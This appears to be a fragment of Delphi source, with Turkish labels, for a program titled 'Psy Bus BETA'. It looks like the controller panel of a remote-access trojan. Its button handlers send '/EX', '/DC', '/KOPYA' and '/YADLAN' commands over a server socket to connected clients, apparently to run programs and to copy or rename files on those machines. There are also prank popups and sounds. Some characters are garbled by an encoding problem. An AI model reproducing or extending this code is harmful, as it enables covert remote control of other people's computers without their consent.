end;

procedure TForm1.kapaaClick(Sender: TObject);
begin
halt;
end;

procedure TForm1.uyariClick(Sender: TObject);
begin
form1.Show;
SetForegroundWindow(form1.Handle)
end;

procedure TForm1.tenemeClick(Sender: TObject);
begin
PlayWavFile('pda.wav');
msnpopup1.Text:='Teneme Teneme:P';
msnpopup1.ShowPopUp;
end;

procedure TForm1.hesaplaaClick(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox('Psy Bus BETA','hesaplanacak?','');
if bilgi='' then exit;
memo1.Lines.add(hesapla(strtoint(bilgi)));
end;

procedure TForm1.ServerSocket1ClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
errorcode := 0;
Memo1.Lines.Add('*** Soket Ar�zas�, Baglant�lar� kontrol et!');
end;

procedure TForm1.FlatButton44Click(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox('Psy Bus BETA','Program ?','');
if bilgi='' then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/EX '+bilgi);
end;

procedure TForm1.FlatButton45Click(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox('Psy Bus BETA','Program ?','');
if bilgi='' then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DC '+bilgi);
end;

procedure TForm1.FlatButton46Click(Sender: TObject);
var
bilgi,b2 : string;
begin
bilgi := inputbox('Dosya kopyala','Kaynak?','');
if bilgi='' then exit;
b2 := inputbox('Dosya Kopyala','Hedef?','');
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/KOPYA '+bilgi+'|'+b2);
end;

procedure TForm1.FlatButton47Click(Sender: TObject);
var
bilgi,b2 : string;
begin
bilgi := inputbox('Yeniden adland�r','Kaynak?','');
if bilgi='' then exit;
b2 := inputbox('Yeniden adland�r','Hedef?','');
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/YADLAN '+bilgi+'|'+b2);
end;

procedure TForm1.MSNPopUp1URLClick(Sender: TObject; URL: String);
begin
form1.Show;
SetForegroundWindow(form1.Handle);
end;

end.
